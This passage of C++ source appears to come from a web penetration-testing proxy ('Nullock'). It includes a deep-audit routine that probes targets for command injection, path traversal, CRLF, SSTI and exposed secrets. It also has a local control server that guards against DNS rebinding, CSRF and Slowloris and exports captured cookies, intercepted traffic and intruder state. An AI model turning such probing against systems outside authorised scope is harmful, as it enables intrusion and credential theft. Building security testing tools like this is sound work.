             res.error.isEmpty() ? where.join(", ") : res.error,
             "critical", "command-injection", "Deep audit: OS command injection " + where.join(", "));
    }
    if (wants("lfi") || wants("pathtraversal") || wants("traversal")) {
        Nullock::Core::PathTraversal::Request ptr;
        ptr.host = t.host; ptr.port = t.port; ptr.tls = t.tls; ptr.method = t.method;
        ptr.basePath = auditPath; ptr.query = auditQuery; ptr.headers = t.headers;
        const auto res = Nullock::Core::PathTraversal::test(ptr);
        QStringList where; for (const auto &h : res.hits) where << h.param + "->" + h.target;
        note("path-traversal", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "critical", "path-traversal", "Deep audit: path traversal " + where.join(", "));
    }
    if (wants("crlf")) {
        Nullock::Core::CrlfInjection::Request cir;
        cir.host = t.host; cir.port = t.port; cir.tls = t.tls; cir.method = t.method;
        cir.basePath = auditPath; cir.query = auditQuery; cir.headers = t.headers;
        const auto res = Nullock::Core::CrlfInjection::test(cir);
        QStringList where; for (const auto &h : res.hits) where << h.param + "/" + h.technique;
        note("crlf", res.hits.size(),
             res.error.isEmpty() ? where.join(", ") : res.error,
             "high", "crlf-injection", "Deep audit: CRLF/response-splitting via " + where.join(", "));
    }
    if (wants("secrets")) {
        Nullock::Core::SecretScanner::Request ssr;
        ssr.host = t.host; ssr.port = t.port; ssr.tls = t.tls;
        ssr.basePath = auditPath; ssr.query = auditQuery; ssr.headers = t.headers;
        const auto res = Nullock::Core::SecretScanner::scan(ssr);
        QStringList types; for (const auto &h : res.hits) types << h.type;
        types.removeDuplicates();
        // Highest severity among the hits drives the aggregate finding.
        QString sev = "medium";
        for (const auto &h : res.hits) {
            if (h.severity == "critical") { sev = "critical"; break; }
            if (h.severity == "high") sev = "high";
        }
        note("secrets", res.hits.size(),
             res.error.isEmpty() ? types.join(", ") : res.error,
             sev, "secret-exposed", "Deep audit: exposed secret(s) " + types.join(", "));
    }
    if (wants("ssti")) {
        // Test each query parameter (capped) for template injection.
        QUrlQuery qq(auditQuery);
        const auto items = qq.queryItems();
        int hits = 0; QStringList engines;
        for (int i = 0; i < items.size() && i < 5; ++i) {
            Nullock::Core::Ssti::Request sr;
            sr.host = t.host; sr.port = t.port; sr.tls = t.tls; sr.method = t.method;
            sr.basePath = auditPath; sr.query = auditQuery; sr.headers = t.headers;
            sr.paramName = items[i].first; sr.paramIn = QStringLiteral("query");
            const auto res = Nullock::Core::Ssti::test(sr);
            if (res.confirmed) { ++hits; engines << res.engines; }
        }
        note("ssti", hits, hits ? engines.join("; ") : "no template injection",
             "critical", "ssti-confirmed", "Deep audit: SSTI (" + engines.join("; ") + ")");
    }
    return total;
}

QByteArray mimeFor(const QString &path) {
    const QString p = path.toLower();
    if (p.endsWith(".html") || p.endsWith(".htm")) return "text/html; charset=utf-8";
    if (p.endsWith(".jsx") || p.endsWith(".js"))   return "application/javascript; charset=utf-8";
    if (p.endsWith(".css"))   return "text/css; charset=utf-8";
    if (p.endsWith(".json"))  return "application/json; charset=utf-8";
    if (p.endsWith(".png"))   return "image/png";
    if (p.endsWith(".svg"))   return "image/svg+xml";
    if (p.endsWith(".woff2")) return "font/woff2";
    if (p.endsWith(".ico"))   return "image/x-icon";
    return "application/octet-stream";
}

QByteArray httpResponse(int status, const QByteArray &mime,
                        const QByteArray &body,
                        const QByteArray &reason = {}) {
    QByteArray out;
    out += "HTTP/1.1 " + QByteArray::number(status) + " "
         + (reason.isEmpty() ? QByteArray("OK") : reason) + "\r\n";
    out += "Content-Type: " + mime + "\r\n";
    out += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
    // No Access-Control-Allow-Origin -- the control server is local-only
    // and exposes private state (proxy history, captured creds). ACAO:*
    // would let any web page in the user's browser read it cross-origin.
    // Same-origin policy is the protection.
    out += "X-Content-Type-Options: nosniff\r\n";
    out += "Cache-Control: no-store\r\n";
    out += "Connection: close\r\n";
    out += "\r\n";
    out += body;
    return out;
}

QByteArray httpJson(int status, const QJsonObject &o) {
    return httpResponse(status, "application/json; charset=utf-8",
                        QJsonDocument(o).toJson(QJsonDocument::Compact));
}

QByteArray httpJson(int status, const QJsonArray &a) {
    return httpResponse(status, "application/json; charset=utf-8",
                        QJsonDocument(a).toJson(QJsonDocument::Compact));
}

QString safeJoin(const QString &dir, const QString &rel) {
    // Strip leading slashes, refuse "..", normalize separators.
    QString r = rel;
    while (r.startsWith('/') || r.startsWith('\\')) r.remove(0, 1);
    if (r.contains("..")) return {};
    return dir + "/" + r;
}

QJsonArray headersToJson(const QList<QPair<QString, QString>> &headers) {
    QJsonArray arr;
    for (const auto &kv : headers) {
        QJsonArray pair;
        pair.append(kv.first);
        pair.append(kv.second);
        arr.append(pair);
    }
    return arr;
}

} // namespace

ControlServer::ControlServer(const Wiring &w, QObject *parent)
    : QObject(parent), m_wiring(w), m_server(new QTcpServer(this)) {
    connect(m_server, &QTcpServer::newConnection, this, &ControlServer::onNewConnection);

    // Bump the snapshot fingerprint whenever any backend object reports a
    // change. The /api/snapshot endpoint accepts ?since=<seq> -- if seq
    // hasn't changed, we return 304 with no body, saving the JSON build.
    auto bump = [this]() { ++m_seq; };
    if (m_wiring.history) {
        connect(m_wiring.history, &QAbstractItemModel::rowsInserted, this, bump);
        connect(m_wiring.history, &QAbstractItemModel::modelReset,   this, bump);
        connect(m_wiring.history, &QAbstractItemModel::dataChanged,  this, bump);
    }
    if (m_wiring.intruder) {
        connect(m_wiring.intruder, &QAbstractItemModel::rowsInserted, this, bump);
        connect(m_wiring.intruder, &QAbstractItemModel::modelReset,   this, bump);
        connect(m_wiring.intruder, &QAbstractItemModel::dataChanged,  this, bump);
    }
    if (m_wiring.proxy) {
        connect(m_wiring.proxy, &Nullock::Proxy::ProxyServer::runningChanged,       this, bump);
        connect(m_wiring.proxy, &Nullock::Proxy::ProxyServer::filteredCountChanged, this, bump);
    }
    if (m_wiring.intercept) {
        connect(m_wiring.intercept, &Nullock::Proxy::InterceptController::currentChanged, this, bump);
        connect(m_wiring.intercept, &Nullock::Proxy::InterceptController::enabledChanged, this, bump);
    }
    if (m_wiring.projectStore) {
        connect(m_wiring.projectStore, &Nullock::Core::ProjectStore::scopeChanged, this, bump);
        connect(m_wiring.projectStore, &Nullock::Core::ProjectStore::rulesChanged, this, bump);
    }
    if (m_wiring.themes) {
        connect(m_wiring.themes, &Nullock::FrontEnd::ThemesManager::themeChanged,  this, bump);
        connect(m_wiring.themes, &Nullock::FrontEnd::ThemesManager::themesChanged, this, bump);
    }
    if (m_wiring.repeater) {
        connect(m_wiring.repeater, &Nullock::Core::Repeater::responseChanged, this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::busyChanged,     this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::targetChanged,   this, bump);
        connect(m_wiring.repeater, &Nullock::Core::Repeater::tabsChanged,     this, bump);
    }
    if (m_wiring.scanner) {
        connect(m_wiring.scanner, &Nullock::Core::PassiveScanner::findingsChanged,
                this, bump);
    }
    if (m_wiring.portScanner) {
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::progressChanged,
                this, bump);
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::resultsChanged,
                this, bump);
        connect(m_wiring.portScanner, &Nullock::Core::PortScanner::runningChanged,
                this, bump);
    }
    if (m_wiring.recon) {
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::dnsRecordsChanged,
                this, bump);
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::subdomainsChanged,
                this, bump);
        connect(m_wiring.recon, &Nullock::Core::ReconEngine::runningChanged,
                this, bump);
    }
    if (m_wiring.sessions) {
        connect(m_wiring.sessions, &Nullock::Core::SessionManager::sessionsChanged,
                this, bump);
    }
}

void ControlServer::bumpSeq() { ++m_seq; }

bool ControlServer::start(const QHostAddress &address, quint16 port) {
    if (m_server->isListening()) return true;
    // 9000/9001 are MinIO defaults so we skip them. 9090 is Prometheus.
    // Pick high-obscure-ports that no common service squats on.
    const QList<quint16> tries = {
        port, 17777, 27777, 37777, 47777, 57777,
    };
    for (quint16 p : tries) {
        if (m_server->listen(address, p)) return true;
    }
    return false;
}

void ControlServer::stop() {
    if (m_server->isListening()) m_server->close();
}

bool ControlServer::isRunning() const { return m_server->isListening(); }
quint16 ControlServer::listeningPort() const { return m_server->serverPort(); }

void ControlServer::onNewConnection() {
    while (QTcpSocket *s = m_server->nextPendingConnection()) {
        connect(s, &QTcpSocket::disconnected, s, &QObject::deleteLater);
        handle(s);
    }
}

void ControlServer::handle(QTcpSocket *socket) {
    // Slowloris defence. Track an absolute wall-clock since accept(); even
    // if the client refills the per-read kReadTimeoutMs by dribbling one
    // byte every 4.9s, the deadline keeps counting and drops them at
    // kHeaderDeadlineMs. Without this, 50 dribbling sockets would each pin
    // the main thread's handle() loop forever and freeze the entire API
    // surface (the UI included, since it polls /api/snapshot).
    QElapsedTimer deadline;
    deadline.start();

    // Read until headers complete.
    QByteArray buf;
    while (!buf.contains("\r\n\r\n")) {
        const qint64 remaining = kHeaderDeadlineMs - deadline.elapsed();
        if (remaining <= 0) {
            socket->write(httpResponse(408, "text/plain", "Header read timeout"));
            socket->disconnectFromHost();
            return;
        }
        const int waitMs = static_cast<int>(std::min<qint64>(remaining, kReadTimeoutMs));
        if (socket->bytesAvailable() == 0 && !socket->waitForReadyRead(waitMs)) {
            socket->disconnectFromHost();
            return;
        }
        buf.append(socket->readAll());
        if (buf.size() > 64 * 1024) {
            socket->write(httpResponse(431, "text/plain", "Headers too large"));
            socket->disconnectFromHost();
            return;
        }
    }

    const int sep = buf.indexOf("\r\n\r\n");
    const QByteArray header = buf.left(sep);
    QByteArray rest = buf.mid(sep + 4);

    const int firstLineEnd = header.indexOf("\r\n");
    const QByteArray requestLine = header.left(firstLineEnd);
    const QList<QByteArray> parts = requestLine.split(' ');
    if (parts.size() < 3) {
        socket->write(httpResponse(400, "text/plain", "Bad request"));
        socket->disconnectFromHost();
        return;
    }
    const QString method = QString::fromLatin1(parts[0]);
    const QString target = QString::fromLatin1(parts[1]);

    // Read body if Content-Length set (for POSTs). While we're walking
    // the headers, also capture Origin + the custom token + Host so we
    // can do a CSRF + DNS-rebinding check before dispatch.
    qint64 contentLength = 0;
    QString origin;
    QString nullockHdr;
    QString hostHdr;
    for (const QByteArray &line : header.split('\n')) {
        QByteArray l = line; if (l.endsWith('\r')) l.chop(1);
        const int c = l.indexOf(':');
        if (c <= 0) continue;
        const QString key = QString::fromLatin1(l.left(c));
        if (key.compare("Content-Length", Qt::CaseInsensitive) == 0) {
            bool ok = false;
            contentLength = QByteArray(l.mid(c + 1)).trimmed().toLongLong(&ok);
            if (!ok || contentLength < 0 || contentLength > kMaxBodyBytes) {
                socket->write(httpResponse(413, "text/plain",
                    "Content-Length invalid or too large"));
                socket->waitForBytesWritten(kReadTimeoutMs);
                socket->disconnectFromHost();
                return;
            }
        }
        else if (key.compare("Origin", Qt::CaseInsensitive) == 0)
            origin = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
        else if (key.compare("X-Nullock-UI", Qt::CaseInsensitive) == 0)
            nullockHdr = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
        else if (key.compare("Host", Qt::CaseInsensitive) == 0)
            hostHdr = QString::fromLatin1(QByteArray(l.mid(c + 1)).trimmed());
    }

    // DNS-rebinding defence. The browser's same-origin policy is "scheme +
    // host + port" -- a malicious page on evil.com whose DNS flips to
    // resolve to 127.0.0.1 (low-TTL DNS rebinding) will still consider
    // itself same-origin with the proxy, and SOP will let it read our
    // responses. The Origin/X-Nullock-UI guard only covers writes; for
    // reads we have to look at the Host header. A rebinded request still
    // carries `Host: evil.com` because the browser uses the URL the page
    // requested. Refuse anything whose Host isn't bound to us.
    const quint16 myPort = this->listeningPort();
    const QString portStr = QString::number(myPort);
    static const QSet<QString> kAllowedHosts = {
        "127.0.0.1:" + portStr,
        "localhost:" + portStr,
        "[::1]:" + portStr,
        // Some clients omit the port when it's the default; we never
        // listen on 80 by default, but allow plain hostnames just in case.
        "127.0.0.1",
        "localhost",
        "[::1]",
    };
    if (!hostHdr.isEmpty() && !kAllowedHosts.contains(hostHdr.toLower())) {
        socket->write(httpResponse(421, "text/plain",
            "Misdirected Host (DNS rebinding defence)"));
        socket->waitForBytesWritten(kReadTimeoutMs);
        socket->disconnectFromHost();
        return;
    }

    // Method validation: known HTTP verbs only. Closes the GET-to-mutating-
    // endpoint vector (probe / replay used to accept any method).
    static const QStringList kAllowed = {
        "GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"
    };
    if (!kAllowed.contains(method)) {
        socket->write(httpResponse(405, "text/plain", "Method not allowed"));
        socket->waitForBytesWritten(kReadTimeoutMs);
        socket->disconnectFromHost();
        return;
    }

    // CSRF guard, hardened. State-mutating endpoints (anything that's
    // not a GET / HEAD / OPTIONS) require BOTH:
    //   (a) a matching same-origin Origin header OR a custom X-Nullock-UI
    //       header that non-browser clients can set freely; and
    //   (b) explicitly NOT an empty Origin when sent from a browser --
    //       previously we allowed empty Origin to pass for curl
    //       compatibility, but a `file://`-loaded HTML page also sends
    //       empty Origin so this bypassed the guard.
    // The custom header costs nothing for scripts (curl sets it via -H),
    // but a malicious cross-origin page can't add it without a CORS
    // preflight, which we never grant.
    const bool isReadMethod = (method == "GET" || method == "HEAD" || method == "OPTIONS");
    if (!isReadMethod) {
        const quint16 myPort = this->listeningPort();
        const QString expectedHttp  = "http://127.0.0.1:"  + QString::number(myPort);
        const QString expectedLocal = "http://localhost:"  + QString::number(myPort);
        const bool originOk = (origin == expectedHttp || origin == expectedLocal);
        const bool tokenOk  = (nullockHdr == "1" || nullockHdr.toLower() == "true");
        if (!originOk && !tokenOk) {
            socket->write(httpResponse(403, "text/plain",
                "Cross-origin write rejected (need same-origin Origin or X-Nullock-UI: 1)"));
            socket->waitForBytesWritten(kReadTimeoutMs);
            socket->disconnectFromHost();
            return;
        }
    }
    // Body-side slowloris defence: same absolute-deadline pattern. A POST
    // claiming kMaxBodyBytes that dribbles in below ~2 MB/sec is either a
    // hostile slow-read or a network so broken there's nothing useful we
    // can do with the result anyway.
    QElapsedTimer bodyDeadline;
    bodyDeadline.start();
    while (rest.size() < contentLength) {
        const qint64 remaining = kBodyDeadlineMs - bodyDeadline.elapsed();
        if (remaining <= 0) {
            socket->disconnectFromHost();
            return;
        }
        const int waitMs = static_cast<int>(std::min<qint64>(remaining, kReadTimeoutMs));
        if (!socket->waitForReadyRead(waitMs)) break;
        rest.append(socket->readAll());
    }
    const QByteArray body = rest.left(contentLength);

    // Route.
    const QUrl url(QStringLiteral("http://x") + target);
    const QString path  = url.path();
    const QString query = url.query();

    QByteArray response;
    if (path.startsWith("/api/")) {
        response = apiResponse(method, path, body, query);
    } else if (path == "/ca.pem" || path == "/ca.crt") {
        // CA cert download. /ca.crt is an alias that triggers the system
        // "install profile" prompt on iOS/Android when opened directly.
        // PEM-formatted; iOS/Android both accept PEM under .crt mime.
        if (!m_wiring.ca || m_wiring.ca->caCertPath().isEmpty()) {
            response = httpResponse(404, "text/plain", "CA not initialized");
        } else {
            QFile f(m_wiring.ca->caCertPath());
            if (!f.open(QIODevice::ReadOnly)) {
                response = httpResponse(500, "text/plain", "could not read CA");
            } else {
                QByteArray hdr;
                hdr += "HTTP/1.1 200 OK\r\n";
                hdr += "Content-Type: application/x-x509-ca-cert\r\n";
                hdr += "Content-Disposition: attachment; filename=\"nullock-ca.crt\"\r\n";
                hdr += "Access-Control-Allow-Origin: *\r\n";
                hdr += "Connection: close\r\n";
                const QByteArray body = f.readAll();
                hdr += "Content-Length: " + QByteArray::number(body.size()) + "\r\n\r\n";
                response = hdr + body;
            }
        }
    } else {
        const QString rel = (path == "/" || path.isEmpty())
                              ? QStringLiteral("Nullock.html")
                              : path;
        response = staticResponse(rel);
    }

    socket->write(response);
    socket->waitForBytesWritten(kReadTimeoutMs);
    socket->disconnectFromHost();
}

QByteArray ControlServer::staticResponse(const QString &path) const {
    if (m_wiring.uiDir.isEmpty())
        return httpResponse(500, "text/plain", "ui dir not configured");
    const QString fsPath = safeJoin(m_wiring.uiDir, path);
    if (fsPath.isEmpty() || !QFileInfo::exists(fsPath))
        return httpResponse(404, "text/plain", "Not found: " + path.toUtf8());
    QFile f(fsPath);
    if (!f.open(QIODevice::ReadOnly))
        return httpResponse(500, "text/plain", "could not open " + path.toUtf8());
    return httpResponse(200, mimeFor(path), f.readAll());
}

bool ControlServer::blocksScope(const QString &host) const {
    return m_wiring.proxy && !host.isEmpty() && !m_wiring.proxy->isInScope(host);
}

QByteArray ControlServer::buildSnapshot() const {
    QJsonObject root;
    root["seq"] = static_cast<qint64>(m_seq);

    // bootInfo
    QJsonObject bootInfo;
    bootInfo["port"]            = m_wiring.proxy ? m_wiring.proxy->listeningPort() : 0;
    bootInfo["caPath"]          = m_wiring.ca ? m_wiring.ca->caCertPath() : QString();
    bootInfo["caDir"]           = m_wiring.ca ? m_wiring.ca->caDir()      : QString();
    bootInfo["hasOpenssl"]      = m_wiring.ca ? m_wiring.ca->hasOpenssl() : false;
    bootInfo["project"]         = m_wiring.projectStore ? m_wiring.projectStore->metadata().name : QString();
    bootInfo["projectDir"]      = m_wiring.projectStore ? m_wiring.projectStore->currentPath() : QString();
    bootInfo["harPath"]         = m_wiring.projectStore ? (m_wiring.projectStore->currentPath() + "/exports/")
                                                       : QString();
    bootInfo["loadedExtensions"]= m_wiring.extensions ? m_wiring.extensions->loadedCount() : 0;
    bootInfo["proxyOn"]         = m_wiring.proxy ? m_wiring.proxy->isRunning() : false;
    bootInfo["h2UpstreamCount"] = m_wiring.proxy ? m_wiring.proxy->h2UpstreamCount() : 0;
    bootInfo["filteredCount"]   = m_wiring.proxy ? m_wiring.proxy->filteredCount() : 0;
    if (m_wiring.proxy) {
        QJsonArray blocked;
        for (const QString &h : m_wiring.proxy->blockedHosts()) blocked.append(h);
        bootInfo["mitmBlocked"]     = blocked;
        bootInfo["controlPort"]     = static_cast<int>(this->listeningPort());
    }
    if (m_wiring.extensions) {
        QJsonArray extLog;
        for (const QString &line : m_wiring.extensions->recentLog(40))
            extLog.append(line);
        bootInfo["extensionsLog"]     = extLog;
        QJsonArray scripts;
        for (const QString &s : m_wiring.extensions->loadedScripts())
            scripts.append(s);
        bootInfo["extensionScripts"]  = scripts;
        bootInfo["extensionsDir"]     = m_wiring.extensions->extensionsDir();
    }
    root["bootInfo"] = bootInfo;

    // themes
    QJsonArray themes;
    if (m_wiring.themes) {
        for (const QString &t : m_wiring.themes->availableThemes()) themes.append(t);
    }
    root["themes"] = themes;
    root["currentTheme"] = m_wiring.themes ? m_wiring.themes->currentTheme() : QString();

    // Colors of the current theme (CSS-style keys without the "--" prefix)
    // plus a flag so the UI can disable "Save" on built-ins (forks happen
    // automatically server-side but the UI may want to surface the rename).
    if (m_wiring.themes) {
        QJsonObject colors;
        const QVariantMap cur = m_wiring.themes->currentColors();
        for (auto it = cur.constBegin(); it != cur.constEnd(); ++it)
            colors.insert(it.key(), it.value().toString());
        root["themeColors"]    = colors;
        root["themeIsBuiltin"] = m_wiring.themes->isBuiltin(m_wiring.themes->currentTheme());
        root["themesDir"]      = m_wiring.themes->themesDir();
    }

    // scope
    QJsonObject scope;
    QJsonArray inArr;
    QJsonArray outArr;
    if (m_wiring.projectStore) {
        for (const QString &s : m_wiring.projectStore->metadata().inScope) inArr.append(s);
        for (const QString &s : m_wiring.projectStore->metadata().outOfScope) outArr.append(s);
        scope["notes"] = m_wiring.projectStore->metadata().notes;
    }
    scope["in"]  = inArr;
    scope["out"] = outArr;
    root["scope"] = scope;

    // match & replace rules
    QJsonArray rulesArr;
    if (m_wiring.projectStore) {
        for (const auto &r : m_wiring.projectStore->rules()) {
            QJsonObject ro;
            ro["enabled"]         = r.enabled;
            ro["name"]            = r.name;
            ro["hostGlob"]        = r.hostGlob;
            ro["section"]         = static_cast<int>(r.section);
            ro["find"]            = r.find;
            ro["replace"]         = r.replace;
            ro["caseInsensitive"] = r.caseInsensitive;
            ro["comment"]         = r.comment;
            rulesArr.append(ro);
        }
    }
    root["rules"] = rulesArr;
    if (m_wiring.proxy) root["rulesHit"] = m_wiring.proxy->rulesHit();

    // passive scanner findings (newest first, capped at 200 in snapshot
    // so a noisy run doesn't bloat every poll). full list is available
    // via /api/findings.
    QJsonArray findingsArr;
    if (m_wiring.scanner) {
        for (const auto &f : m_wiring.scanner->findings(200)) {
            QJsonObject fo;
            fo["id"]       = f.id;
            fo["rowId"]    = f.rowId;
            fo["ts"]       = f.ts.toString(Qt::ISODate);
            fo["severity"] = f.severity;
            fo["kind"]     = f.kind;
            fo["summary"]  = f.summary;
            fo["evidence"] = f.evidence;
            fo["host"]     = f.host;
            fo["url"]      = f.url;
            // Enrichment: CWE / OWASP / CVSS / compliance / fix
            fo["cwe"]        = f.cwe;
            fo["owasp"]      = f.owasp;
            fo["cvssScore"]  = f.cvssScore;
            fo["cvssVector"] = f.cvssVector;
            QJsonArray comp;
            for (const QString &c : f.compliance) comp.append(c);
            fo["compliance"] = comp;
            fo["fixSummary"] = f.fixSummary;
            findingsArr.append(fo);
        }
        root["findingsCount"] = m_wiring.scanner->count();
    }
    root["findings"] = findingsArr;

    // port scanner
    if (m_wiring.portScanner) {
        QJsonObject ps;
        ps["host"]    = m_wiring.portScanner->host();
        ps["running"] = m_wiring.portScanner->running();
        ps["done"]    = m_wiring.portScanner->done();
        ps["total"]   = m_wiring.portScanner->total();
        ps["error"]   = m_wiring.portScanner->lastError();
        QJsonArray rows;
        for (const auto &r : m_wiring.portScanner->results()) {
            QJsonObject ro;
            ro["host"]    = r.host;
            ro["port"]    = r.port;
            ro["status"]  = r.status;
            ro["latency"] = r.latencyMs;
            ro["banner"]  = r.banner;
            ro["service"] = r.service;
            rows.append(ro);
        }
        ps["results"] = rows;
        root["portScan"] = ps;
    }

    // recon engine: DNS records + discovered subdomains
    if (m_wiring.recon) {
        QJsonObject rec;
        rec["target"]  = m_wiring.recon->target();
        rec["running"] = m_wiring.recon->running();
        rec["error"]   = m_wiring.recon->lastError();
        QJsonArray dns;
        for (const auto &r : m_wiring.recon->dnsRecords()) {
            QJsonObject d;
            d["type"]     = r.type;
            d["value"]    = r.value;
            d["priority"] = r.priority;
            dns.append(d);
        }
        rec["dns"] = dns;
        QJsonArray subs;
        for (const auto &s : m_wiring.recon->subdomains()) {
            QJsonObject so;
            so["name"]   = s.name;
            so["source"] = s.source;
            QJsonArray ips;
            for (const QString &ip : s.resolvedIps) ips.append(ip);
            so["ips"]    = ips;
            subs.append(so);
        }
        rec["subdomains"] = subs;
        root["recon"] = rec;
    }

    // sessions: per-host captured cookies
    if (m_wiring.sessions) {
        QJsonArray arr;
        for (const auto &s : m_wiring.sessions->sessions()) {
            QJsonObject so;
            so["host"]       = s.host;
            so["autoInject"] = s.autoInject;
            so["lastSeen"]   = s.lastSeen;
            QJsonArray cookies;
            for (const auto &c : s.cookies) {
                QJsonObject co;
                co["name"]     = c.name;
                co["value"]    = c.value;
                co["path"]     = c.path;
                co["expires"]  = c.expires;
                co["httpOnly"] = c.httpOnly;
                co["secure"]   = c.secure;
                co["sameSite"] = c.sameSite;
                cookies.append(co);
            }
            so["cookies"] = cookies;
            arr.append(so);
        }
        root["sessions"] = arr;
    }

    // history rows (match the mock shape so React renders without changes)
    QJsonArray rows;
    if (m_wiring.history) {
        const int n = m_wiring.history->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.history->index(i, 0);
            QJsonObject row;
            row["id"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::IdRole).toInt();
            row["host"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::HostRole).toString();
            row["method"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::MethodRole).toString();
            row["url"]     = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::UrlRole).toString();
            row["path"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::UrlRole).toString();
            row["status"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::StatusCodeRole).toInt();
            row["mime"]    = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::MimeRole).toString();
            row["params"]  = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::ParamsRole).toInt();
            row["tls"]     = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::TlsRole).toBool();
            row["ip"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::IpRole).toString();
            row["ts"]      = m_wiring.history->data(idx, Nullock::FrontEnd::ProxyModel::TimestampRole).toString();
            row["port"]    = m_wiring.history->portAt(i);
            // Surface response body size so the React stats panel can do
            // Wireshark-style "endpoints" aggregation. Request size feeds
            // the same per-host accounting.
            const auto *resp = m_wiring.history->responseAt(i);
            const auto *req  = m_wiring.history->requestAt(i);
            row["size"]    = resp ? static_cast<qint64>(resp->body.size()) : 0;
            row["reqSize"] = req  ? static_cast<qint64>(req->body.size())  : 0;
            row["elapsed"] = 0;
            rows.append(row);
        }
    }
    root["rows"] = rows;

    // sitemap
    QJsonArray sitemap;
    if (m_wiring.siteMap) {
        const int n = m_wiring.siteMap->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.siteMap->index(i, 0);
            QJsonObject entry;
            entry["host"]  = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::HostRole).toString();
            entry["count"] = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::CountRole).toInt();
            entry["tls"]   = m_wiring.siteMap->data(idx, Nullock::FrontEnd::SiteMapModel::TlsRole).toBool();
            sitemap.append(entry);
        }
    }
    root["sitemap"] = sitemap;

    // intercepted queue (current + future-pending count)
    QJsonArray intercepted;
    if (m_wiring.intercept && m_wiring.intercept->current()) {
        QObject *cur = m_wiring.intercept->current();
        QJsonObject e;
        e["id"]   = cur->property("id").toInt();
        e["host"] = cur->property("host").toString();
        e["port"] = cur->property("port").toInt();
        e["tls"]  = cur->property("tls").toBool();
        e["text"] = cur->property("text").toString();
        intercepted.append(e);
    }
    root["intercepted"]      = intercepted;
    root["interceptEnabled"] = m_wiring.intercept ? m_wiring.intercept->enabled() : false;

    // repeater
    QJsonObject repeater;
    if (m_wiring.repeater) {
        repeater["host"]       = m_wiring.repeater->host();
        repeater["port"]       = m_wiring.repeater->port();
        repeater["tls"]        = m_wiring.repeater->useTls();
        repeater["request"]    = m_wiring.repeater->requestText();
        repeater["response"]   = m_wiring.repeater->responseText();
        repeater["statusLine"] = m_wiring.repeater->statusLine();
        repeater["busy"]       = m_wiring.repeater->busy();
        repeater["activeTab"]  = m_wiring.repeater->activeTab();
        QJsonArray tabs;
        for (const auto &t : m_wiring.repeater->tabs()) {
            QJsonObject to;
            to["name"]       = t.name;
            to["host"]       = t.host;
            to["port"]       = t.port;
            to["tls"]        = t.useTls;
            to["statusLine"] = t.statusLine;
            tabs.append(to);
        }
        repeater["tabs"] = tabs;
    }
    root["repeater"] = repeater;

    // intruder
    QJsonObject intruder;
    if (m_wiring.intruder) {
        using Nullock::Core::Intruder;
        intruder["host"]       = m_wiring.intruder->host();
        intruder["port"]       = m_wiring.intruder->port();
        intruder["tls"]        = m_wiring.intruder->useTls();
        intruder["template"]   = m_wiring.intruder->requestTemplate();
        intruder["attackType"] = m_wiring.intruder->attackType();
        intruder["positions"]  = m_wiring.intruder->positionCount();
        intruder["payloads"]   = QJsonArray::fromStringList(
            m_wiring.intruder->payloads().split('\n', Qt::SkipEmptyParts));
        // payloadSets: one array of lines per marker position.
        QJsonArray setsArr;
        for (const QString &block : m_wiring.intruder->payloadSets())
            setsArr.append(QJsonArray::fromStringList(block.split('\n', Qt::SkipEmptyParts)));
        intruder["payloadSets"] = setsArr;
        intruder["running"]     = m_wiring.intruder->running();
        QJsonArray results;
        const int n = m_wiring.intruder->rowCount();
        for (int i = 0; i < n; ++i) {
            const QModelIndex idx = m_wiring.intruder->index(i, 0);
            QJsonObject r;
            const int status = m_wiring.intruder->data(idx, Intruder::StatusRole).toInt();
            const bool complete = m_wiring.intruder->data(idx, Intruder::CompleteRole).toBool();
            const int size = m_wiring.intruder->data(idx, Intruder::SizeRole).toInt();
            const int ms   = m_wiring.intruder->data(idx, Intruder::TimeRole).toInt();
            r["row"]      = i;
            r["payload"]  = m_wiring.intruder->data(idx, Intruder::PayloadRole).toString();
            r["payloads"] = QJsonArray::fromStringList(
                m_wiring.intruder->data(idx, Intruder::PayloadsRole).toStringList());
            r["status"] = complete ? QJsonValue(status) : QJsonValue(QJsonValue::Null);
            r["size"]   = size;
            r["length"] = size;   // alias
            r["ms"]     = ms;
            r["time"]   = ms;      // alias
            r["err"]    = m_wiring.intruder->data(idx, Intruder::ErrorRole).toString();
            results.append(r);
        }
        intruder["results"] = results;
    }
    root["intruder"] = intruder;

    // Update info -- one HTTPS round-trip at startup, cached forever.
    if (m_wiring.updates) {
        const auto u = m_wiring.updates->lastResult();
        QJsonObject upd;
        upd["available"]      = u.available;
        upd["currentVersion"] = u.currentVersion;
        upd["latestVersion"]  = u.latestVersion;
        upd["releaseUrl"]     = u.releaseUrl;
        upd["releaseNotes"]   = u.releaseNotes;
        upd["publishedAt"]    = u.publishedAt;
        root["update"] = upd;
    }

    // OAST sink visibility for the UI badge.
    if (m_wiring.oast) {
        QJsonObject oast;
        oast["running"]  = m_wiring.oast->running();
        oast["port"]     = m_wiring.oast->port();
        oast["baseHost"] = m_wiring.oast->baseHost();
        oast["hits"]     = m_wiring.oast->hitCount();
        if (m_wiring.oastCorrelator) {
            oast["registered"] = m_wiring.oastCorrelator->registeredCount();
